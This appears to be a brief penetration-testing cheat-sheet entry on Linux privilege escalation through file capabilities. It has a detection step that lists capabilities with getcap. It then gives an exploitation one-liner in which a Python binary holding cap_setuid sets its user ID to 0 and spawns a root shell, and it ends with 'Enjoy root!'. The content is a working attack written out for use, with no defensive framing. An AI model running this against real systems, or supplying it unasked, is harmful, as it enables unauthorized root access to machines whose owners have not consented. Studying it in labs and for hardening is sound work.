***Detection***
[[privilege escalation]] technique taking advantage of the capabilities functionality.
- In command prompt type: 
```
   getcap -r / 2>/dev/null
```

- From the output, notice the value of the “cap_setuid” capability.

***Exploitation***
- In command prompt type:
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- Enjoy root!